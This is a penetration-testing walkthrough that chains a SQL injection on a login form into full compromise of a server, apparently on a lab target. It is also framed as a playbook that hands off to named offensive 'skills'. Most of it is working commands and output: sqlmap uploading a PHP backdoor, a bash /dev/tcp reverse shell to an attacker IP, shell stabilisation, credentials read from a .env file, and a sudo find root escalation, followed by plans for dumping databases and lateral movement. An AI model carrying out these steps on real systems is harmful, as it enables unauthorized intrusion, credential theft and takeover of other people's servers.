# SQL Injection to OS Shell Chain

## Scenario
Web application with confirmed SQL injection on login form, MySQL backend.

## Step 1: Confirm Injection & DB Access
```bash
$ sqlmap -u "http://10.10.10.75/login.php" --data "username=admin&password=test" \
  --batch --dbs

available databases [3]:
[*] information_schema
[*] megacorp_app
[*] mysql
```

## Step 2: Check OS Shell Capability
```bash
$ sqlmap -u "http://10.10.10.75/login.php" --data "username=admin&password=test" \
  --batch --os-shell

[16:02:15] [INFO] going to use a web backdoor for command prompt
[16:02:15] [INFO] which web application language does the target support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[16:02:15] [INFO] trying to upload the file stager on '/var/www/html/'
[16:02:16] [INFO] the file stager has been successfully uploaded on '/var/www/html/'
[16:02:16] [INFO] the backdoor has been successfully uploaded on '/var/www/html/'
[16:02:16] [INFO] calling OS shell

os-shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

os-shell> whoami
www-data

os-shell> uname -a
Linux webserver01 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

os-shell> cat /etc/os-release | head -2
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
```

## Step 3: Upgrade to Reverse Shell
```bash
# On attacker:
$ nc -lvnp 4444
listening on [any] 4444 ...

# On target via os-shell:
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Attacker receives connection:
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.75] 48234
www-data@webserver01:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Step 4: Shell Stabilization
```bash
www-data@webserver01:$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@webserver01:/var/www/html$ ^Z
[1]+  Stopped
$ stty raw -echo; fg
www-data@webserver01:/var/www/html$ export TERM=xterm
www-data@webserver01:/var/www/html$ stty rows 50 cols 200
```

## Step 5: Initial Enumeration
```bash
www-data@webserver01:/var/www/html$ cat /var/www/html/.env
DB_HOST=localhost
DB_USER=root
DB_PASS=S3cur3DB!Pass#2024
DB_NAME=megacorp_app

www-data@webserver01:/var/www/html$ sudo -l
(ALL) NOPASSWD: /usr/bin/find
```

## Evidence Captured
- SQLi type: UNION + stacked queries
- OS: Ubuntu 20.04, kernel 5.4.0-150
- User: www-data
- DB credentials: root / S3cur3DB!Pass#2024
- Sudo privesc: find NOPASSWD (instant root)

## Next Steps
→ **privilege_escalation skill**: `sudo find / -exec /bin/bash \; -quit` → root
→ **credential_access skill**: Access MySQL as root, dump all databases
→ **lateral_movement skill**: Test DB password on SSH, other services
